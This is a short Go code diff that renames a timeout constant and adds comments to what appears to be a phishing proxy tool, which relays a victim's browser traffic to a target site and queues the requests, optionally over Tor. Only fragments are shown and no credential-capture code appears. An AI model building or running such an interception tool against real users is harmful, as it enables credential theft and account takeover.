@@ -15,7 +15,8 @@ import (
 )
 
 const (
-	DEFAULT_TIMEOUT = 20 * time.Second
+	// DefaultTimeout is the HTTP client timeout.
+	DefaultTimeout = 20 * time.Second
 )
 
 var (
@@ -25,7 +26,7 @@ var (
 	proxyAddress   = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
 )
 
-// Phishes a target URL with a custom HTTP client.
+// PhishingProxy proxies requests between the victim and the target, queuing requests for further processing.
 type PhishingProxy struct {
 	client    *http.Client
 	targetURL *url.URL
@@ -38,6 +39,8 @@ func (p *PhishingProxy) rewriteHeaders(request *http.Request) {
 	request.RequestURI = ""
 }
 
+// HandleConnection does the actual work of proxying the HTTP request between the victim and the target.
+// Accepts the TCP connection from the victim's browser and a channel to send http Requests on to the processing worker thread.
 func (p *PhishingProxy) HandleConnection(conn net.Conn, requests chan<- *http.Request) {
 	defer conn.Close()
 	reader := bufio.NewReader(conn)
@@ -96,7 +99,7 @@ func main() {
 	log.Println("Listening on:", *address)
 
 	client := &http.Client{
-		Timeout: DEFAULT_TIMEOUT,
+		Timeout: DefaultTimeout,
 	}
 
 	if *proxyAddress != "" {
